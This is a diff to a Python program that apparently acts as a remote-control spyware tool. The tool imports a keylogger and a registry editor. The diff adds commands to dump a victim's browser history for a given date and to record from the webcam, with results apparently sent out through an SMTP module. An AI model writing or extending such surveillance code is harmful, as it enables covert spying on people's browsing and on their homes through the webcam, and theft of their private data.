@@ -11,7 +11,7 @@ import keylog as kl
 import registry as reg
 import utils
 import threading
-
+import history
 
 dir_data = "data/"
 
@@ -162,6 +162,35 @@ def execute_one_command(cmd):
 
         res = reg.edit_registry(basekey, subkey, name, value)
         return [cmd, res]
+    # his <browser> <date>
+    elif cmd.startswith('his'):
+        browser, date =  cmd[10:].split(' ')
+        print(browser, date)
+        his = history.History(browser).get_history_by_date(date)
+        if str(his) == '':
+            return [cmd, 'Browser is not installed OR Browser is not used in that date']
+        file_path = dir_data + browser + " "  + date.replace("/", "-") + ".his"
+        file_his = open(file_path, "w+")
+
+        file_his.write(str(his))
+        subj = browser + " History at " + date
+        return [cmd, subj, file_path]
+        # webcamrecord: quay 5 giay, 24 fps
+    # webcamrecord 12345 --3 --24: quay 3 giay, 24 fps
+    elif (cmd.startswith('vid-cam')):
+        if(cmd.count("--") == 2):
+            res = smtp.webcamrecord(int(cmd[cmd.find("--")+2:cmd.rfind("--")]), 
+                                            int(cmd[cmd.rfind("--") + 2:]))
+        elif (cmd.count("--") == 1):
+            res = smtp.webcamrecord(int(cmd[cmd.find("--")+2:]))
+        else:
+            res = smtp.webcamrecord()
+        now = datetime.now().strftime("%H:%M:%S, %Y/%m/%d")
+        
+        if res[0] == False:
+            return [cmd, f"Record fail at {now}", res[1]]
+        else:
+            return [cmd, f"Webcamrecord at {now}", res[1]]
     else:
         return [cmd, 'Invalid command']
 
